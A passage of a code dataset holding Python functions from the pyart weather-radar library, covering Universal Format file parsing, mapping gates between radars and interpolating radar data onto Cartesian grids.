        fobj.read(padding)
        buf = fobj.read(8)
    self.nrays = len(self.rays)
    self.ray_sweep_numbers = self._get_ray_sweep_numbers()
    self.nsweeps = len(np.unique(self.ray_sweep_numbers))
    (first_ray_in_sweep, last_ray_in_sweep) = self._get_sweep_limits()
    self.first_ray_in_sweep = first_ray_in_sweep
    self.last_ray_in_sweep = last_ray_in_sweep"
ARM-DOE/pyart,close,"def close(self):
    """"""Close the file.""""""
    self._fh.close()"
ARM-DOE/pyart,_get_ray_sweep_numbers,"def _get_ray_sweep_numbers(self):
    """"""Return an array of the sweep_number stored in each ray.""""""
    ray_sweep_numbers = np.empty((self.nrays,), dtype='int32')
    for (i, ray) in enumerate(self.rays):
        ray_sweep_numbers[i] = ray.mandatory_header['sweep_number']
    return ray_sweep_numbers"
ARM-DOE/pyart,_get_sweep_limits,"def _get_sweep_limits(self):
    """"""Return arrays of indices of first and last ray in each sweep.""""""
    first_ray_in_sweep = np.empty(self.nsweeps, dtype='int32')
    last_ray_in_sweep = np.empty(self.nsweeps, dtype='int32')
    unique_sweep_numbers = np.unique(self.ray_sweep_numbers)
    for (i, sweep_number) in enumerate(unique_sweep_numbers):
        matches = np.where(self.ray_sweep_numbers == sweep_number)
        first_ray_in_sweep[i] = matches[0][0]
        last_ray_in_sweep[i] = matches[0][-1]
    return (first_ray_in_sweep, last_ray_in_sweep)"
ARM-DOE/pyart,get_field_data,"def get_field_data(self, field_number):
    """"""Return a 2D array of scale/masked field data for the volume.""""""
    first_ray = self.rays[0]
    ngates = len(first_ray.field_raw_data[field_number])
    missing_data_value = first_ray.mandatory_header['missing_data_value']
    scale_factor = first_ray.field_headers[field_number]['scale_factor']
    raw_data = np.empty((self.nrays, ngates), 'int16')
    for (i, ray) in enumerate(self.rays):
        ray_data = ray.field_raw_data[field_number]
        bins = len(ray_data)
        raw_data[i, :bins] = ray.field_raw_data[field_number]
        raw_data[i, bins:] = missing_data_value
    data = raw_data / float(scale_factor)
    mask = raw_data == missing_data_value
    return np.ma.masked_array(data, mask)"
ARM-DOE/pyart,get_azimuths,"def get_azimuths(self):
    """"""Return an array of azimuth angles for each ray in degrees.""""""
    azimuth = np.empty((self.nrays,), dtype='float32')
    for (i, ray) in enumerate(self.rays):
        azimuth[i] = ray.mandatory_header['azimuth'] / 64.0
    return azimuth"
ARM-DOE/pyart,get_elevations,"def get_elevations(self):
    """"""Return an array of elevation angles for each ray in degrees.""""""
    elevation = np.empty((self.nrays,), dtype='float32')
    for (i, ray) in enumerate(self.rays):
        elevation[i] = ray.mandatory_header['elevation'] / 64.0
    return elevation"
ARM-DOE/pyart,get_sweep_rates,"def get_sweep_rates(self):
    """"""Return an array of sweep rates for each ray in degrees/sec.""""""
    sweep_rates = np.empty((self.nrays,), dtype='float32')
    for (i, ray) in enumerate(self.rays):
        sweep_rates[i] = ray.mandatory_header['sweep_rate'] / 64.0
    return sweep_rates"
ARM-DOE/pyart,get_pulse_widths,"def get_pulse_widths(self):
    """"""Return an array of pulse widths for each ray in meters.""""""
    pulse_widths = np.empty((self.nrays,), dtype='float32')
    for (i, ray) in enumerate(self.rays):
        pulse_widths[i] = ray.field_headers[0]['pulse_width_m']
    return pulse_widths"
ARM-DOE/pyart,get_prts,"def get_prts(self):
    """"""Return an array of prts for each ray in microseconds.""""""
    prts = np.empty((self.nrays,), dtype='float32')
    for (i, ray) in enumerate(self.rays):
        prts[i] = ray.field_headers[0]['prt_ms']
    return prts"
ARM-DOE/pyart,get_nyquists,"def get_nyquists(self):
    """"""
        Return an array of nyquist velocities for each ray in m/s.

        Returns None if nyquist velocities cannot be determined for all rays.
        """"""
    field_headers = self.rays[0].field_headers
    try:
        field_idx = ['nyquist' in fh for fh in field_headers].index(True)
    except ValueError:
        return None
    nyquist = np.empty((self.nrays,), dtype='float32')
    for (i, ray) in enumerate(self.rays):
        scale = ray.field_headers[field_idx]['scale_factor']
        try:
            nyquist[i] = ray.field_headers[field_idx]['nyquist'] / scale
        except KeyError:
            return None
    return nyquist"
ARM-DOE/pyart,get_sweep_fixed_angles,"def get_sweep_fixed_angles(self):
    """"""Return an array of fixed angles for each sweep in degrees.""""""
    fixed = np.empty((self.nsweeps,), dtype='float32')
    for (i, ray_num) in enumerate(self.first_ray_in_sweep):
        fixed[i] = self.rays[ray_num].mandatory_header['fixed_angle'] / 64.0
    return fixed"
ARM-DOE/pyart,get_sweep_polarizations,"def get_sweep_polarizations(self):
    """"""Return an array of polarization modes for each sweep.""""""
    modes = []
    for ray_num in self.first_ray_in_sweep:
        ray = self.rays[ray_num]
        polarization = ray.field_headers[0]['polarization']
        if polarization > 3:
            polarization = 3
        modes.append(POLARIZATION_STR[polarization])
    return np.array(modes)"
ARM-DOE/pyart,get_datetimes,"def get_datetimes(self):
    """"""Return a list of datetimes for each ray.""""""
    return [ray.get_datetime() for ray in self.rays]"
ARM-DOE/pyart,__init__,"def __init__(self, record):
    """"""Initalize the object.""""""
    self._buf = record
    self.mandatory_header = _unpack_from_buf(self._buf, 0, UF_MANDATORY_HEADER)
    self.optional_header = None
    if self.mandatory_header['offset_optional_header'] != 0:
        offset = (self.mandatory_header['offset_optional_header'] - 1) * 2
        self.optional_header = _unpack_from_buf(self._buf, offset, UF_OPTIONAL_HEADER)
    offset = (self.mandatory_header['offset_data_header'] - 1) * 2
    self.data_header = _unpack_from_buf(self._buf, offset, UF_DATA_HEADER)
    self.field_positions = [_unpack_from_buf(self._buf, offset + 6 + i * 4, UF_FIELD_POSITION) for i in range(self.data_header['record_nfields'])]
    self.field_headers = []
    self.field_raw_data = [self.get_field_data(i) for i in range(self.data_header['record_nfields'])]
    return"
ARM-DOE/pyart,get_field_data,"def get_field_data(self, field_number):
    """"""
        Return array of raw data for a particular field in the ray.

        Field header is appended to the list in the field_headers attribute.
        """"""
    position = self.field_positions[field_number]
    offset = (position['offset_field_header'] - 1) * 2
    field_header = _unpack_from_buf(self._buf, offset, UF_FIELD_HEADER)
    self.field_headers.append(field_header)
    data_offset = (field_header['data_offset'] - 1) * 2
    if position['data_type'] in [b'VF', b'VE', b'VR', b'VT', b'VP']:
        if data_offset - offset == 42:
            vel_header = _unpack_from_buf(self._buf, offset + 38, UF_FSI_VEL)
            field_header.update(vel_header)
    data_str = self._buf[data_offset:data_offset + field_header['nbins'] * 2]
    raw_data = np.frombuffer(data_str, dtype='>i2')
    return raw_data"
ARM-DOE/pyart,get_datetime,"def get_datetime(self):
    """"""Return a datetime object for the ray.""""""
    year = self.mandatory_header['year']
    if year < 1900:
        year += 2000
    month = self.mandatory_header['month']
    day = self.mandatory_header['day']
    hour = self.mandatory_header['hour']
    minute = self.mandatory_header['minute']
    second = self.mandatory_header['second']
    if hour == 24:
        assert minute == 0
        assert second == 0
        hour = 23
        minute = 59
        second = 59
        dt = datetime.datetime(year, month, day, hour, minute, second)
        return dt + datetime.timedelta(seconds=1)
    return datetime.datetime(year, month, day, hour, minute, second)"
ARM-DOE/pyart,get_location,"def get_location(self):
    """"""Return the latitude, longitude and height of the ray.""""""
    lat_deg = self.mandatory_header['latitude_degrees']
    lat_min = self.mandatory_header['latitude_minutes']
    lat_sec = self.mandatory_header['latitude_seconds'] / 64.0
    latitude = lat_deg + (lat_min + lat_sec / 60.0) / 60.0
    lon_deg = self.mandatory_header['longitude_degrees']
    lon_min = self.mandatory_header['longitude_minutes']
    lon_sec = self.mandatory_header['longitude_seconds'] / 64.0
    longitude = lon_deg + (lon_min + lon_sec / 60.0) / 60.0
    height = self.mandatory_header['height_above_sea_level']
    return (latitude, longitude, height)"
ARM-DOE/pyart,__init__,"def __init__(self, src_radar: Radar, dest_radar: Radar, distance_tolerance=500.0, gatefilter_src=None, time_tolerance=60.0):
    gate_x = dest_radar.gate_x['data']
    gate_y = dest_radar.gate_y['data']
    gate_z = dest_radar.gate_altitude['data']
    proj_dict = {'proj': 'pyart_aeqd', 'lon_0': dest_radar.longitude['data'], 'lat_0': dest_radar.latitude['data']}
    (self.src_radar_x, self.src_radar_y) = geographic_to_cartesian(src_radar.longitude['data'], src_radar.latitude['data'], proj_dict)
    data = np.stack([gate_x.flatten(), gate_y.flatten(), gate_z.flatten()], axis=1)
    self._kdtree = KDTree(data)
    self.dest_radar = dest_radar
    self.src_radar = src_radar
    self.src_radar_time = np.tile(src_radar.time['data'], (1, src_radar.ngates)).flatten()
    self.dest_radar_time = np.tile(dest_radar.time['data'], (1, dest_radar.ngates)).flatten()
    if gatefilter_src is None:
        self.gatefilter_src = pyart.filters.GateFilter(self.src_radar)
        self.gatefilter_src.exclude_none()
    else:
        self.gatefilter_src = gatefilter_src
    self._time_tolerance = time_tolerance
    self._distance_tolerance = distance_tolerance
    self.distance_tolerance = distance_tolerance"
ARM-DOE/pyart,__getitem__,"def __getitem__(self, key: tuple):
    """"""Return the equivalent index in the destination radar's coordinates""""""
    x = (int(self._index_map[key[0], key[1], 0]), int(self._index_map[key[0], key[1], 1]))
    if x[0] > 0:
        return x
    else:
        return (None, None)"
ARM-DOE/pyart,distance_tolerance,"@property
def distance_tolerance(self):
    """"""
        Getter for distance_tolerance property of GateMapper class.

        Returns
        -------
        tolerance: float
            The current distance tolerance of the GateMapper in meters.
        """"""
    return self._distance_tolerance"
ARM-DOE/pyart,time_tolerance,"@property
def time_tolerance(self):
    """"""
        Getter for time_tolerance property of GateMapper class.

        Returns
        -------
        time_tolerance: float
            The current time tolerance of the GateMapper in meters.
        """"""
    return self._time_tolerance"
ARM-DOE/pyart,time_tolerance,"@time_tolerance.setter
def time_tolerance(self, time_tolerance):
    """"""
        Setter for the time_tolerance property of GateMapper class. This will
        also reset the mapping function inside GateMapper so that no additional
        calls are needed to reset the tolerance.

        Parameters
        ----------
        time_tolerance: float
            The new time tolerance of the GateMapper in seconds.
        """"""
    self._time_tolerance = time_tolerance
    self.tolerance = self._distance_tolerance"
ARM-DOE/pyart,distance_tolerance,"@distance_tolerance.setter
def distance_tolerance(self, distance_tolerance):
    """"""
        Setter for the distance_tolerance property of GateMapper class. This will
        also reset the mapping function inside GateMapper so that no additional
        calls are needed to reset the tolerance.

        Parameters
        ----------
        distance_tolerance: float
            The new distance tolerance of the GateMapper in meters.
        """"""
    self._index_map = np.stack([np.nan * np.ones_like(self.src_radar.gate_x['data']), np.nan * np.ones_like(self.src_radar.gate_x['data'])], axis=2)
    new_points = np.stack([self.src_radar.gate_x['data'].flatten() + self.src_radar_x, self.src_radar.gate_y['data'].flatten() + self.src_radar_y, self.src_radar.gate_altitude['data'].flatten()], axis=1)
    (dists, inds) = self._kdtree.query(new_points, distance_upper_bound=distance_tolerance)
    inds[inds == len(self.dest_radar_time)] = inds[inds == len(self.dest_radar_time)] - 1
    times = np.abs(self.src_radar_time - self.dest_radar_time[inds])
    inds = np.where(np.logical_and(times < self._time_tolerance, np.abs(dists) < distance_tolerance), inds[:], -32767).astype(int)
    inds = np.reshape(inds, self.src_radar.gate_x['data'].shape)
    self._index_map[:, :, 0] = (inds / self.dest_radar.gate_x['data'].shape[1]).astype(int)
    self._index_map[:, :, 1] = inds - self.dest_radar.gate_x['data'].shape[1] * (inds / self.dest_radar.gate_x['data'].shape[1]).astype(int)
    self._distance_tolerance = distance_tolerance"
ARM-DOE/pyart,mapped_radar,"def mapped_radar(self, field_list):
    """"""
        This returns a version of the destination radar with the fields in field_list from the source radar
        mapped into the destination radar's coordinate system.

        Parameters
        ----------
        field_list: list of str or str
            The list of fields to map.

        Returns
        -------
        mapped_radar:
            The destination radar with the fields from the source radar mapped into the destination radar's
            coordinate system.
        """"""
    mapped_radar = deepcopy(self.dest_radar)
    if isinstance(field_list, str):
        field_list = [field_list]
    src_fields = {}
    for field in field_list:
        if field in list(mapped_radar.fields.keys()):
            mapped_radar.fields[field]['data'] = np.ma.masked_where(True, mapped_radar.fields[field]['data'])
        else:
            mapped_radar.fields[field] = deepcopy(self.src_radar.fields[field])
            mapped_radar.fields[field]['data'] = np.ma.masked_where(True, np.ma.zeros((mapped_radar.nrays, mapped_radar.ngates)))
        src_fields[field] = np.ma.masked_where(self.gatefilter_src.gate_excluded, self.src_radar.fields[field]['data'])
    for i in range(self.src_radar.nrays):
        for j in range(self.src_radar.ngates):
            index = self[i, j]
            if index[0] is not None:
                for field in field_list:
                    mapped_radar.fields[field]['data'][index] = src_fields[field][i, j]
    del src_fields
    return mapped_radar"
ARM-DOE/pyart,map_gates_to_grid,"def map_gates_to_grid(radars, grid_shape, grid_limits, grid_origin=None, grid_origin_alt=None, grid_projection=None, fields=None, gatefilters=False, map_roi=True, weighting_function='Barnes2', toa=17000.0, roi_func='dist_beam', constant_roi=None, z_factor=0.05, xy_factor=0.02, min_radius=500.0, h_factor=1.0, nb=1.5, bsp=1.0, zdist_factor=1.0, **kwargs):
    """"""
    Map gates from one or more radars to a Cartesian grid.

    Generate a Cartesian grid of points for the requested fields from the
    collected points from one or more radars. For each radar gate that is not
    filtered a radius of influence is calculated. The weighted field values
    for that gate are added to all grid points within that radius. This
    routine scaled linearly with the number of radar gates and the effective
    grid size.

    Parameters not defined below are identical to those in
    :py:func:`map_to_grid`.

    Parameters
    ----------
    roi_func : str or RoIFunction
        Radius of influence function. A function which takes an
        z, y, x grid location, in meters, and returns a radius (in meters)
        within which all collected points will be included in the weighting
        for that grid points. Examples can be found in the
        Typically following strings can use to specify a built in
        radius of influence function:

            * constant: constant radius of influence.
            * dist: radius grows with the distance from each radar.
            * dist_beam: radius grows with the distance from each radar
              and parameter are based of virtual beam sizes.

        A custom RoIFunction can be defined using the RoIFunction class
        and defining a get_roi method which returns the radius. For efficient
        mapping this class should be implemented in Cython.

    Returns
    -------
    grids : dict
        Dictionary of mapped fields. The keys of the dictionary are given by
        parameter fields. Each elements is a `grid_size` float64 array
        containing the interpolated grid for that field.

    See Also
    --------
    grid_from_radars : Map to a grid and return a Grid object
    map_to_grid : Create grid by finding the radius of influence around each
                  grid point.

    """"""
    if isinstance(radars, Radar):
        radars = (radars,)
    if len(radars) == 0:
        raise ValueError('Length of radars tuple cannot be zero')
    skip_transform = False
    if len(radars) == 1 and grid_origin_alt is None and (grid_origin is None):
        skip_transform = True
    if grid_origin_alt is None:
        try:
            grid_origin_alt = float(radars[0].altitude['data'])
        except TypeError:
            grid_origin_alt = np.mean(radars[0].altitude['data'])
    gatefilters = _parse_gatefilters(gatefilters, radars)
    cy_weighting_function = _detemine_cy_weighting_func(weighting_function)
    projparams = _find_projparams(grid_origin, radars, grid_projection)
    fields = _determine_fields(fields, radars)
    (grid_starts, grid_steps) = _find_grid_params(grid_shape, grid_limits)
    offsets = _find_offsets(radars, projparams, grid_origin_alt)
    roi_func = _parse_roi_func(roi_func, constant_roi, z_factor, xy_factor, min_radius, h_factor, nb, bsp, offsets)
    nfields = len(fields)
    grid_sum = np.zeros(grid_shape + (nfields,), dtype=np.float32)
    grid_wsum = np.zeros(grid_shape + (nfields,), dtype=np.float32)
    gatemapper = GateToGridMapper(grid_shape, grid_starts, grid_steps, grid_sum, grid_wsum)
    for (radar, gatefilter) in zip(radars, gatefilters):
        if nfields == 0:
            raise ValueError('There are 0 fields in the radar object to interpolate!')
        shape = (radar.nrays, radar.ngates, nfields)
        field_data = np.empty(shape, dtype='float32')
        field_mask = np.empty(shape, dtype='uint8')
        for (i, field) in enumerate(fields):
            fdata = radar.fields[field]['data']
            field_data[:, :, i] = np.ma.getdata(fdata)
            field_mask[:, :, i] = np.ma.getmaskarray(fdata)
        if gatefilter is False:
            gatefilter = GateFilter(radar)
        elif gatefilter is None:
            gatefilter = moment_based_gate_filter(radar, **kwargs)
        excluded_gates = gatefilter.gate_excluded.astype('uint8')
        if skip_transform:
            gate_x = radar.gate_x['data']
            gate_y = radar.gate_y['data']
        else:
            (gate_x, gate_y) = geographic_to_cartesian(radar.gate_longitude['data'], radar.gate_latitude['data'], projparams)
        gate_z = radar.gate_altitude['data'] - grid_origin_alt
        gatemapper.map_gates_to_grid(radar.ngates, radar.nrays, gate_z.astype('float32'), gate_y.astype('float32'), gate_x.astype('float32'), field_data, field_mask, excluded_gates, roi_func, cy_weighting_function, zdist_factor)
    mweight = np.ma.masked_equal(grid_wsum, 0)
    msum = np.ma.masked_array(grid_sum, mweight.mask)
    grids = {f: msum[..., i] / mweight[..., i] for (i, f) in enumerate(fields)}
    if map_roi:
        roi_array = np.empty(grid_shape, dtype=np.float32)
        gatemapper.find_roi_for_grid(roi_array, roi_func)
        grids['ROI'] = roi_array
    gc.collect()
    return grids"
ARM-DOE/pyart,_detemine_cy_weighting_func,"def _detemine_cy_weighting_func(weighting_function):
    """"""Determine cython weight function value.""""""
    if weighting_function.upper() == 'BARNES2':
        cy_weighting_function = 3
    elif weighting_function.upper() == 'NEAREST':
        cy_weighting_function = 2
    elif weighting_function.upper() == 'CRESSMAN':
        cy_weighting_function = 1
    elif weighting_function.upper() == 'BARNES':
        warnings.warn('Barnes weighting function is deprecated. Please use Barnes 2 to be consistent with Pauley and Wu 1990. Default will be switched to Barnes2 on June 1st.', DeprecationWarning)
        cy_weighting_function = 0
    else:
        raise ValueError('unknown weighting_function')
    return cy_weighting_function"
ARM-DOE/pyart,_find_projparams,"def _find_projparams(grid_origin, radars, grid_projection):
    """"""Determine the projection parameter.""""""
    if grid_origin is None:
        try:
            lat = float(radars[0].latitude['data'])
            lon = float(radars[0].longitude['data'])
        except TypeError:
            lat = np.mean(radars[0].latitude['data'])
            lon = np.mean(radars[0].longitude['data'])
        grid_origin = (lat, lon)
    (grid_origin_lat, grid_origin_lon) = grid_origin
    if grid_projection is None:
        grid_projection = {'proj': 'pyart_aeqd', '_include_lon_0_lat_0': True}
    projparams = grid_projection.copy()
    if projparams.pop('_include_lon_0_lat_0', False):
        projparams['lon_0'] = grid_origin_lon
        projparams['lat_0'] = grid_origin_lat
    return projparams"
ARM-DOE/pyart,_parse_gatefilters,"def _parse_gatefilters(gatefilters, radars):
    """"""Parse the gatefilters parameter.""""""
    if isinstance(gatefilters, GateFilter):
        gatefilters = (gatefilters,)
    if gatefilters is False:
        gatefilters = (False,) * len(radars)
    if gatefilters is None:
        gatefilters = (None,) * len(radars)
    if len(gatefilters) != len(radars):
        raise ValueError('Length of gatefilters must match length of radars')
    return gatefilters"
ARM-DOE/pyart,_determine_fields,"def _determine_fields(fields, radars):
    """"""Determine which field should be mapped to the grid.""""""
    if fields is None:
        fields = set(radars[0].fields.keys())
        for radar in radars[1:]:
            fields = fields.intersection(radar.fields.keys())
        fields = list(fields)
    return fields"
ARM-DOE/pyart,_find_offsets,"def _find_offsets(radars, projparams, grid_origin_alt):
    """"""Find offset between radars and grid origin.""""""
    offsets = []
    for radar in radars:
        (x_disp, y_disp) = geographic_to_cartesian(radar.longitude['data'], radar.latitude['data'], projparams)
        try:
            z_disp = float(radar.altitude['data']) - grid_origin_alt
            offsets.append((z_disp, float(y_disp), float(x_disp)))
        except TypeError:
            z_disp = np.mean(radar.altitude['data']) - grid_origin_alt
            offsets.append((z_disp, np.mean(y_disp), np.mean(x_disp)))
    return offsets"
ARM-DOE/pyart,_find_grid_params,"def _find_grid_params(grid_shape, grid_limits):
    """"""Find the starting points and step size of the grid.""""""
    (nz, ny, nx) = grid_shape
    (zr, yr, xr) = grid_limits
    (z_start, z_stop) = zr
    (y_start, y_stop) = yr
    (x_start, x_stop) = xr
    if nz == 1:
        z_step = 0.0
    else:
        z_step = (z_stop - z_start) / (nz - 1.0)
    if ny == 1:
        y_step = 0.0
    else:
        y_step = (y_stop - y_start) / (ny - 1.0)
    if nx == 1:
        x_step = 0.0
    else:
        x_step = (x_stop - x_start) / (nx - 1.0)
    grid_starts = (z_start, y_start, x_start)
    grid_steps = (z_step, y_step, x_step)
    return (grid_starts, grid_steps)"
ARM-DOE/pyart,_parse_roi_func,"def _parse_roi_func(roi_func, constant_roi, z_factor, xy_factor, min_radius, h_factor, nb, bsp, offsets):
    """"""Return the Radius of influence object.""""""
    if not isinstance(roi_func, RoIFunction):
        if constant_roi is not None:
            roi_func = 'constant'
        else:
            constant_roi = 500.0
        if roi_func == 'constant':
            roi_func = ConstantRoI(constant_roi)
        elif roi_func == 'dist':
            roi_func = DistRoI(z_factor, xy_factor, min_radius, offsets)
        elif roi_func == 'dist_beam':
            roi_func = DistBeamRoI(h_factor, nb, bsp, min_radius, offsets)
        else:
            raise ValueError('unknown roi_func: %s' % roi_func)
    return roi_func"
ARM-DOE/pyart,grid_from_radars,"def grid_from_radars(radars, grid_shape, grid_limits, gridding_algo='map_gates_to_grid', copy_field_dtypes=True, **kwargs):
    """"""
    Map one or more radars to a Cartesian grid returning a Grid object.

    Additional arguments are passed to :py:func:`map_to_grid` or
    :py:func:`map_gates_to_grid`.

    Parameters
    ----------
    radars : Radar or tuple of Radar objects.
        Radar objects which will be mapped to the Cartesian grid.
    grid_shape : 3-tuple of floats
        Number of points in the grid (z, y, x).
    grid_limits : 3-tuple of 2-tuples
        Minimum and maximum grid location (inclusive) in meters for the
        z, y, x coordinates.
    gridding_algo : 'map_to_grid' or 'map_gates_to_grid'
        Algorithm to use for gridding. 'map_to_grid' finds all gates within
        a radius of influence for each grid point, 'map_gates_to_grid' maps
        each radar gate onto the grid using a radius of influence and is
        typically significantly faster.
    copy_field_dtypes : bool
        Whether or not to maintain the original dtypes found in the radar
        fields, which will then be used in the grid fields.

    Returns
    -------
    grid : Grid
        A :py:class:`pyart.io.Grid` object containing the gridded radar
        data.

    See Also
    --------
    map_to_grid : Map to grid and return a dictionary of radar fields.
    map_gates_to_grid : Map each gate onto a grid returning a dictionary of
                        radar fields.

    References
    ----------
    Barnes S., 1964: A Technique for Maximizing Details in Numerical Weather
    Map Analysis. Journal of Applied Meteorology and Climatology, 3(4),
    396-409.

    Cressman G., 1959: An operational objective analysis system. Monthly
    Weather Review, 87(10), 367-374.

    Pauley, P. M. and X. Wu, 1990: The theoretical, discrete, and actual
    response of the Barnes objective analysis scheme for one- and
    two-dimensional fields. Monthly Weather Review, 118, 1145-1164

    """"""
    if isinstance(radars, Radar):
        radars = (radars,)
    if len(radars) == 0:
        raise ValueError('Length of radars tuple cannot be zero')
    if gridding_algo == 'map_to_grid':
        grids = map_to_grid(radars, grid_shape, grid_limits, **kwargs)
    elif gridding_algo == 'map_gates_to_grid':
        grids = map_gates_to_grid(radars, grid_shape, grid_limits, **kwargs)
    else:
        raise ValueError('invalid gridding_algo')
    fields = {}
    first_radar = radars[0]
    for field in grids.keys():
        if field == 'ROI':
            fields['ROI'] = {'data': grids['ROI'], 'standard_name': 'radius_of_influence', 'long_name': 'Radius of influence for mapping', 'units': 'm', 'least_significant_digit': 1, '_FillValue': get_fillvalue()}
        else:
            fields[field] = {'data': grids[field]}
            for key in first_radar.fields[field].keys():
                if key == 'data':
                    continue
                fields[field][key] = first_radar.fields[field][key]
    time = get_metadata('grid_time')
    time['data'] = np.array([first_radar.time['data'][0]])
    time['units'] = first_radar.time['units']
    (nz, ny, nx) = grid_shape
    ((z0, z1), (y0, y1), (x0, x1)) = grid_limits
    x = get_metadata('x')
    x['data'] = np.linspace(x0, x1, nx)
    y = get_metadata('y')
    y['data'] = np.linspace(y0, y1, ny)
    z = get_metadata('z')
    z['data'] = np.linspace(z0, z1, nz)
    origin_latitude = get_metadata('origin_latitude')
    origin_longitude = get_metadata('origin_longitude')
    if 'grid_origin' in kwargs:
        origin_latitude['data'] = np.array([kwargs['grid_origin'][0]])
        origin_longitude['data'] = np.array([kwargs['grid_origin'][1]])
    else:
        origin_latitude['data'] = first_radar.latitude['data']
        origin_longitude['data'] = first_radar.longitude['data']
    origin_altitude = get_metadata('origin_altitude')
    if 'grid_origin_alt' in kwargs:
        origin_altitude['data'] = np.array([kwargs['grid_origin_alt']])
    else:
        origin_altitude['data'] = first_radar.altitude['data']
    metadata = dict(first_radar.metadata)
    radar_latitude = get_metadata('radar_latitude')
    radar_latitude['data'] = np.array([r.latitude['data'][0] for r in radars])
    radar_longitude = get_metadata('radar_longitude')
    radar_longitude['data'] = np.array([radar.longitude['data'][0] for radar in radars])
    radar_altitude = get_metadata('radar_altitude')
    radar_altitude['data'] = np.array([radar.altitude['data'][0] for radar in radars])
    radar_time = get_metadata('radar_time')
    (times, units) = _unify_times_for_radars(radars)
    radar_time['units'] = units
    radar_time['data'] = times
    radar_name = get_metadata('radar_name')
    name_key = 'instrument_name'
    names = [radar.metadata[name_key] if name_key in radar.metadata else '' for radar in radars]
    radar_name['data'] = np.array(names)
    projection = kwargs.pop('grid_projection', None)
    if copy_field_dtypes:
        for field in fields.keys():
            if field == 'ROI':
                continue
            dtype = first_radar.fields[field]['data'].dtype
            fields[field]['data'] = fields[field]['data'].astype(dtype)
    return Grid(time, fields, metadata, origin_latitude, origin_longitude, origin_altitude, x, y, z, radar_latitude=radar_latitude, radar_longitude=radar_longitude, radar_altitude=radar_altitude, radar_name=radar_name, radar_time=radar_time, projection=projection)"
ARM-DOE/pyart,_unify_times_for_radars,"def _unify_times_for_radars(radars):
    """"""Return unified start times and units for a number of radars.""""""
    dates = [netCDF4.num2date(radar.time['data'][0], radar.time['units']) for radar in radars]
    units = make_time_unit_str(min(dates))
    times = netCDF4.date2num(dates, units)
    return (times, units)"
ARM-DOE/pyart,map_to_grid,"def map_to_grid(radars, grid_shape, grid_limits, grid_origin=None, grid_origin_alt=None, grid_projection=None, fields=None, gatefilters=False, map_roi=True, weighting_function='Barnes2', toa=17000.0, copy_field_data=True, algorithm='kd_tree', leafsize=10, roi_func='dist_beam', constant_roi=None, z_factor=0.05, xy_factor=0.02, min_radius=500.0, h_factor=1.0, nb=1.5, bsp=1.0, **kwargs):
    """"""
    Map one or more radars to a Cartesian grid.

    Generate a Cartesian grid of points for the requested fields from the
    collected points from one or more radars. The field value for a grid
    point is found by interpolating from the collected points within a given
    radius of influence and weighting these nearby points according to their
    distance from the grid points. Collected points are filtered
    according to a number of criteria so that undesired points are not
    included in the interpolation.

    Parameters
    ----------
    radars : Radar or tuple of Radar objects.
        Radar objects which will be mapped to the Cartesian grid.
    grid_shape : 3-tuple of floats
        Number of points in the grid (z, y, x).
    grid_limits : 3-tuple of 2-tuples
        Minimum and maximum grid location (inclusive) in meters for the
        z, y, x coordinates.
    grid_origin : (float, float) or None
        Latitude and longitude of grid origin. None sets the origin
        to the location of the first radar.
    grid_origin_alt: float or None
        Altitude of grid origin, in meters. None sets the origin
        to the location of the first radar.
    grid_projection : dict
        Projection parameters defining the map projection used to transform the
        locations of the radar gates in geographic coordinate to Cartesian
        coodinates. None will use the default dictionary which uses a native
        azimutal equidistance projection. See :py:func:`pyart.core.Grid` for
        additional details on this parameter. The geographic coordinates of
        the radar gates are calculated using the projection defined for each
        radar. No transformation is used if a grid_origin and grid_origin_alt
        are None and a single radar is specified.
    fields : list or None
        List of fields within the radar objects which will be mapped to
        the cartesian grid. None, the default, will map the fields which are
        present in all the radar objects.
    gatefilters : GateFilter, tuple of GateFilter objects, optional
        Specify what gates from each radar will be included in the
        interpolation onto the grid. Only gates specified in each gatefilters
        will be included in the mapping to the grid. A single GateFilter can
        be used if a single Radar is being mapped. A value of False for a
        specific element or the entire parameter will apply no filtering of
        gates for a specific radar or all radars (the default).
        Similarily a value of None will create a GateFilter from the
        radar moments using any additional arguments by passing them to
        :py:func:`moment_based_gate_filter`.
    roi_func : str or function
        Radius of influence function. A functions which takes an
        z, y, x grid location, in meters, and returns a radius (in meters)
        within which all collected points will be included in the weighting
        for that grid points. Examples can be found in the
        :py:func:`example_roi_func_constant`,
        :py:func:`example_roi_func_dist`, and
        :py:func:`example_roi_func_dist_beam`.
        Alternatively the following strings can use to specify a built in
        radius of influence function:

            * constant: constant radius of influence.
            * dist: radius grows with the distance from each radar.
            * dist_beam: radius grows with the distance from each radar
              and parameter are based of virtual beam sizes.

        The parameters which control these functions are listed in the
        `Other Parameters` section below.
    map_roi : bool
        True to include a radius of influence field in the returned
        dictionary under the 'ROI' key. This is the value of roi_func at all
        grid points.
    weighting_function : 'Barnes' or 'Barnes2' or 'Cressman' or 'Nearest'
        Functions used to weight nearby collected points when interpolating a
        grid point.
    toa : float
        Top of atmosphere in meters. Collected points above this height are
        not included in the interpolation.

    Other Parameters
    ----------------
    constant_roi : float
        Radius of influence parameter for the built in 'constant' function.
        This parameter is the constant radius in meter for all grid points.
        This parameter is used when `roi_func` is `constant` or constant_roi
        is not None. If constant_roi is not None, the constant roi_func is
        used automatically.
    z_factor, xy_factor, min_radius : float
        Radius of influence parameters for the built in 'dist' function.
        The parameter correspond to the radius size increase, in meters,
        per meter increase in the z-dimension from the nearest radar,
        the same foreach meteter in the xy-distance from the nearest radar,
        and the minimum radius of influence in meters. These parameters are
        only used when `roi_func` is 'dist'.
    h_factor, nb, bsp, min_radius : float
        Radius of influence parameters for the built in 'dist_beam' function.
        The parameter correspond to the height scaling, virtual beam width,
        virtual beam spacing, and minimum radius of influence. These
        parameters are only used when `roi_func` is 'dist_mean'.
    copy_field_data : bool
        True to copy the data within the radar fields for faster gridding,
        the dtype for all fields in the grid will be float64. False will not
        copy the data which preserves the dtype of the fields in the grid,
        may use less memory but results in significantly slower gridding
        times. When False gates which are masked in a particular field but
        are not masked in the `refl_field` field will still be included in
        the interpolation. This can be prevented by setting this parameter
        to True or by gridding each field individually setting the
        `refl_field` parameter and the `fields` parameter to the field in
        question. It is recommended to set this parameter to True.
    algorithm : 'kd_tree'.
        Algorithms to use for finding the nearest neighbors. 'kd_tree' is the
        only valid option.
    leafsize : int
        Leaf size passed to the neighbor lookup tree. This can affect the
        speed of the construction and query, as well as the memory required
        to store the tree. The optimal value depends on the nature of the
        problem. This value should only effect the speed of the gridding,
        not the results.

    Returns
    -------
    grids : dict
        Dictionary of mapped fields. The keys of the dictionary are given by
